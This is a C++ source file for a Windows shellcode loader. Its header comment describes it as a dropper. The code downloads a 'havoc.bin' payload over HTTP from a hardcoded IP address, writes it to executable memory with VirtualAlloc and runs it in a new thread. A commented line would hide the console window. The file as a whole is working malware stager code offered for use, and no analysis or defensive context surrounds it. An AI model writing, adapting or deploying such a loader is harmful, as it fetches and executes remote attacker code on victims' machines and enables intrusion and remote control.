/*
shell code loader in memory :
01- act as Dropper
02- Downlaod "havoc.bin" and loaded in memory 
03- if we close the powershell session the Connection has been dead
*/

#include <Windows.h>
#include <winhttp.h>
#include <vector>

#pragma comment(lib, "winhttp.lib")

std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename);
void ExecuteShellcode(std::vector<BYTE>& shellcode);

int main()
{
    // Hide console window (optional)
    // ShowWindow(GetConsoleWindow(), SW_HIDE);

    std::vector<BYTE> shellcode = Download(L"192.168.215.132", L"/havoc.bin");

    if (!shellcode.empty()) {
        ExecuteShellcode(shellcode);
    }

    // Keep process alive indefinitely
    while (true) {
        Sleep(60000); // Sleep for 1 minute
    }

    return 0;
}

void ExecuteShellcode(std::vector<BYTE>& shellcode) {
    LPVOID ptr = VirtualAlloc(NULL, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (ptr != NULL) {
        memcpy(ptr, shellcode.data(), shellcode.size());

        HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ptr, NULL, 0, NULL);

        if (hThread != NULL) {
            // Thread is running independently
            CloseHandle(hThread); // We can close handle, thread continues running
        }
    }
    // Don't free memory - shellcode is using it
}

std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename) {
    std::vector<BYTE> buffer;

    HINTERNET hSession = WinHttpOpen(L"UserAgent/1.0", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return buffer;

    HINTERNET hConnect = WinHttpConnect(hSession, baseAddress, INTERNET_DEFAULT_HTTP_PORT, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return buffer;
    }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", filename, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return buffer;
    }

    if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
        WinHttpReceiveResponse(hRequest, NULL)) {

        DWORD bytesRead = 0;
        BYTE temp[4096];

        do {
            bytesRead = 0;
            if (WinHttpReadData(hRequest, temp, sizeof(temp), &bytesRead) && bytesRead > 0) {
                buffer.insert(buffer.end(), temp, temp + bytesRead);
            }
        } while (bytesRead > 0);
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return buffer;
}
